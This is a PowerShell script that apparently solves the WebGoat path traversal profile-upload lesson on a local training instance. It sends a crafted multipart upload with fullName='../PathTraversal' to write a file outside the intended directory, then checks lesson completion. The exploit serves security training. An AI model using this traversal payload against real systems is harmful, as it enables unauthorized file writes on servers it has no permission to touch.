# Path Traversal - Profile Upload Solution

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Path Traversal - File Upload" -ForegroundColor Yellow  
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Paste JSESSIONID:" -ForegroundColor White
$sessionId = Read-Host

Write-Host ""
Write-Host "Creating test image file..." -ForegroundColor Cyan

$testFile = "C:\Users\mahad\scripts\test.jpg"

# Create a minimal valid JPEG file
$jpegBytes = [byte[]](0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xFF, 0xD9)
[System.IO.File]::WriteAllBytes($testFile, $jpegBytes)

Write-Host "Created test.jpg ($((Get-Item $testFile).Length) bytes)" -ForegroundColor Green
Write-Host ""
Write-Host "Exploiting path traversal in fullName field..." -ForegroundColor Cyan
Write-Host ""

try {
    # The vulnerability: fullName field is not validated
    # Path construction: PathTraversal/nooniman/<fullName>/file
    # Using ../PathTraversal in fullName escapes to PathTraversal root
    
    $response = curl.exe -s -X POST "http://localhost:8001/WebGoat/PathTraversal/profile-upload" `
        -H "Cookie: JSESSIONID=$sessionId" `
        -H "X-Requested-With: XMLHttpRequest" `
        -F "uploadedFile=@$testFile" `
        -F "fullName=../PathTraversal" `
        -F "email=test@test.com" `
        -F "password=test" 2>$null | ConvertFrom-Json
    
    if ($response.lessonCompleted -eq $true) {
        Write-Host "SUCCESS!" -ForegroundColor Green
        Write-Host ""
        Write-Host "Lesson completed!" -ForegroundColor Green
        Write-Host "Feedback: $($response.feedback)" -ForegroundColor White
        Write-Host ""
        Write-Host "Exploit details:" -ForegroundColor Cyan
        Write-Host "  - Vulnerability: Unvalidated fullName field" -ForegroundColor White
        Write-Host "  - Payload: fullName=../PathTraversal" -ForegroundColor White
        Write-Host "  - Result: File uploaded to PathTraversal root directory" -ForegroundColor White
        
        # Verify file was created
        $targetPath = "C:\Users\mahad\.webgoat-2025.3\PathTraversal"
        $uploadedFile = Get-ChildItem $targetPath -File | Where-Object {$_.LastWriteTime -gt (Get-Date).AddMinutes(-1)} | Select-Object -First 1
        if ($uploadedFile) {
            Write-Host ""
            Write-Host "Uploaded file: $($uploadedFile.FullName)" -ForegroundColor Green
        }
    } else {
        Write-Host "Failed: $($response.feedback)" -ForegroundColor Red
    }
} catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
} finally {
    # Cleanup
    Remove-Item $testFile -Force -ErrorAction SilentlyContinue
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
